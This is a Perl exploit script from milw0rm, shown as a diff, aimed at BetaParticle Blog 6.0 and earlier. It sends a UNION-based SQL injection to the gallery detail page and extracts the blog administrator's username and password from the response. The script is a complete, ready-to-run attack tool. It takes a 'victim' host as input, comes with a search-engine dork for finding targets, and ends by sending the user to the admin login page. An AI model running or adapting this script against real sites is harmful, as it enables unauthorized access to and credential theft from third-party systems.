@@ -1,0 +1,67 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=20
+#Usage: beta.pl <host> <path>
+#googledork: [ "Powered by bp blog" ] 9.710 pages..
+use IO::Socket;
+if(@ARGV != 2) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print "\n- NukedX Security Advisory Nr.2006-20\r\n";
+  print "- BetaParticle Blog <= 6.0 Remote SQL Injection Vulnerability\r\n";
+}
+sub usage() 
+{
+  header();
+  print "- Usage: $0 <host> <path>\r\n";
+  print "- <host> -> Victim's host ex: www.victim.com\r\n";
+  print "- <path> -> Path to BetaParticle ex: /blog\r\n";
+  exit();
+}
+sub exploit () {
+  #Our variables...
+  $bpserver = $ARGV[0];
+  $bpserver =~ s/(http:\/\/)//eg;
+  $bphost   = "http://".$bpserver;
+  $bpdir    = $ARGV[1];
+  $bpport   = "80";
+  $bptar    = "template_gallery_detail.asp?fldGalleryID=";
+  $bpfinal  = "main.asp";
+  $bpxp     = "-1+UNION+SELECT+null,fldAuthorUsername,fldAuthorPassword,null,null+FROM+tblAuthor+where+fldAuthorId=1";
+  $bpreq    = $bphost.$bpdir.$bptar.$bpxp;
+  #Sending data...
+  header();
+  print "- Trying to connect: $bpserver\r\n";
+  $bp = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$bpserver", PeerPort => "$bpport") || die "- Connection failed...\n";
+  print $bp "GET $bpreq HTTP/1.1\n";
+  print $bp "Accept: */*\n";
+  print $bp "Referer: $bphost\n";
+  print $bp "Accept-Language: tr\n";
+  print $bp "User-Agent: NukeZilla 4.3\n";
+  print $bp "Cache-Control: no-cache\n";
+  print $bp "Host: $bpserver\n";
+  print $bp "Connection: close\n\n";
+  print "- Connected...\r\n";
+  while ($answer = <$bp>) {
+    if ($answer =~ /<h3>(.*?)<\/h3>/) {
+      print "- Exploit succeed! Getting admin's information\r\n";
+      print "- Username: $1\r\n";
+    }
+    if ($answer =~ /<p>(.*?)<\/p>/) {
+      print "- Password: $1\r\n";
+      print "- Lets go $bphost$bpdir$bpfinal for admin login.\r\n";
+      exit();
+    }
+    if ($answer =~ /number of columns/) { 
+      print "- This version of BetaParticle is vulnerable too\r\n";
+      print "- but default query of SQL-Inj. does not work on it\r\n";
+      print "- So please edit query by manually adding null data..\r\n";
+      exit(); 
+    }
+  }
+  print "- Exploit failed\n"
+}
+
+# milw0rm.com [2006-03-18]
